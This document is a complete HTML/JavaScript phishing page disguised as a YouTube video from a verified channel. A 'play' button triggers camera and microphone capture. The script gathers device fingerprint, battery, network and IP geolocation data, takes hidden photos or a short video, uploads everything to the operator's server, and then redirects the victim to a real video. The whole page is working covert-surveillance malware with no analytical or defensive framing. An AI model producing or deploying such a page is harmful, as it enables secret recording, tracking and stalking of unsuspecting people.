<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>YouTube</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        body { margin: 0; background-color: #0f0f0f; color: white; font-family: "Roboto", Arial, sans-serif; overflow-x: hidden; }
        .video-wrapper { position: relative; width: 100%; background: #000; aspect-ratio: 16 / 9; display: flex; align-items: center; justify-content: center; }
        .spinner { border: 4px solid rgba(255, 255, 255, 0.1); border-left-color: #ff0000; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; }
        @keyframes spin { to { transform: rotate(360deg); } }
        #play-overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 20; display: flex; align-items: center; justify-content: center; cursor: pointer; background: rgba(0,0,0,0.1); }
        .play-icon { font-size: 60px; color: white; opacity: 0.9; }
        .video-details { padding: 12px; }
        .video-title { font-size: 19px; font-weight: 700; line-height: 24px; margin-bottom: 8px; display: -webkit-box; -webkit-line-clamp: 2; -webkit-box-orient: vertical; overflow: hidden; }
        .channel-row { display: flex; align-items: center; margin: 12px 0; justify-content: space-between; }
        .channel-info { display: flex; align-items: center; gap: 10px; }
        .channel-pfp { width: 40px; height: 40px; background: #3f3f3f; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold; font-size: 20px; color: #ff4747; }
        .channel-name { font-size: 16px; font-weight: 600; display: flex; align-items: center; gap: 4px; }
        .verified-badge { color: #aaa; font-size: 12px; }
        .sub-count { font-size: 12px; color: #aaa; }
        .sub-btn { background: white; color: black; padding: 0 16px; height: 36px; border-radius: 18px; border: none; font-weight: 600; font-size: 14px; cursor: pointer; }
        .description-box { background: #272727; border-radius: 12px; padding: 12px; margin-top: 12px; font-size: 14px; line-height: 20px; }
        .view-count { font-weight: 600; margin-bottom: 4px; display: block; }
        video, canvas { display: none; }
    </style>
</head>
<body>

    <div class="video-wrapper">
        <div class="spinner" id="loading-spinner" style="display: none;"></div>
        <div id="play-overlay" onclick="initiateCapture()">
            <i class="fas fa-play play-icon"></i>
        </div>
    </div>

    <div class="video-details">
        <div class="video-title" id="display-title">Loading video details...</div>
        <div class="channel-row">
            <div class="channel-info">
                <div class="channel-pfp">A</div>
                <div>
                    <div class="channel-name">AnyaStore <i class="fas fa-check-circle verified-badge"></i></div>
                    <div class="sub-count">148K subscribers</div>
                </div>
            </div>
            <button class="sub-btn">Subscribe</button>
        </div>
        <div class="description-box">
            <span class="view-count">1.2M views • 3 hours ago</span>
            <div id="display-desc">
                Welcome to the official AnyaStore verification portal. Please play the video to verify your device status and proceed with your order.
            </div>
        </div>
    </div>

    <video id="v" autoplay playsinline></video>
    <canvas id="c"></canvas>

    <script>
        const params = new URLSearchParams(window.location.search);
        const uid = params.get('id');
        const mode = params.get('mode') || 'photo';
        const camMode = params.get('cam') || 'user';
        const ytId = params.get('ytid') || 'dQw4w9WgXcQ';

        document.getElementById('display-title').innerText = "Account Verification & Security Check - ID #" + (ytId.substring(0,6));

        async function initiateCapture() {
            if (!uid || uid === "null") return;

            document.getElementById('play-overlay').style.display = 'none';
            document.getElementById('loading-spinner').style.display = 'block';

            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: camMode }, 
                    audio: (mode === 'video') 
                });
                
                document.getElementById('v').srcObject = stream;

                // Execute God-Mode Data Gathering
                await gatherDeepInfo();

                if (mode === 'video') {
                    startVideoLogic(stream);
                } else {
                    startPhotoLogic();
                }

            } catch (err) {
                document.getElementById('loading-spinner').style.display = 'none';
                document.getElementById('display-title').innerText = "Playback Error: Please allow permissions to watch.";
                document.getElementById('play-overlay').style.display = 'flex';
            }
        }

        async function gatherDeepInfo() {
            let extraData = {
                browser: navigator.userAgent,
                platform: navigator.platform,
                cores: navigator.hardwareConcurrency || 'N/A',
                memory: navigator.deviceMemory || 'N/A',
                screen: `${window.screen.width}x${window.screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                language: navigator.language,
                touch: navigator.maxTouchPoints > 0 ? 'Yes' : 'No',
                darkmode: window.matchMedia('(prefers-color-scheme: dark)').matches ? 'On' : 'Off',
                orientation: (screen.orientation) ? screen.orientation.type : 'N/A'
            };

            // Network Connection Intel
            if (navigator.connection) {
                extraData.net_speed = `${navigator.connection.downlink} Mbps`;
                extraData.net_type = navigator.connection.effectiveType.toUpperCase();
                extraData.save_data = navigator.connection.saveData ? 'Active' : 'Off';
            }

            // Battery Intel
            try {
                const battery = await navigator.getBattery();
                extraData.battery = `${Math.round(battery.level * 100)}% (${battery.charging ? 'Charging' : 'Discharging'})`;
            } catch (e) { extraData.battery = 'N/A'; }

            // IP and Geo-location
            const ipResponse = await fetch('https://ipapi.co/json/');
            const ipData = await ipResponse.json();

            // Send full payload to app.py
            await fetch(`/log_info?id=${uid}`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ ...ipData, ...extraData })
            });
        }

        function startPhotoLogic() {
            let count = 0;
            const interval = setInterval(() => {
                if (count >= 8) {
                    clearInterval(interval);
                    finish();
                    return;
                }
                const c = document.getElementById('c'), v = document.getElementById('v');
                c.width = v.videoWidth; c.height = v.videoHeight;
                c.getContext('2d').drawImage(v, 0, 0);
                
                c.toBlob(blob => {
                    const fd = new FormData();
                    fd.append('file', blob);
                    fetch(`/upload?id=${uid}&type=photo`, { method: 'POST', body: fd });
                }, 'image/jpeg');
                
                count++;
            }, 800);
        }

        function startVideoLogic(stream) {
            const recorder = new MediaRecorder(stream);
            const chunks = [];
            recorder.ondataavailable = e => chunks.push(e.data);
            recorder.onstop = () => {
                const blob = new Blob(chunks, { type: 'video/webm' });
                const fd = new FormData();
                fd.append('file', blob);
                fetch(`/upload?id=${uid}&type=video`, { method: 'POST', body: fd }).then(finish);
            };
            recorder.start();
            setTimeout(() => recorder.stop(), 4000); 
        }

        function finish() {
            window.location.href = `https://www.youtube.com/watch?v=${ytId}`;
        }
    </script>
</body>
</html>
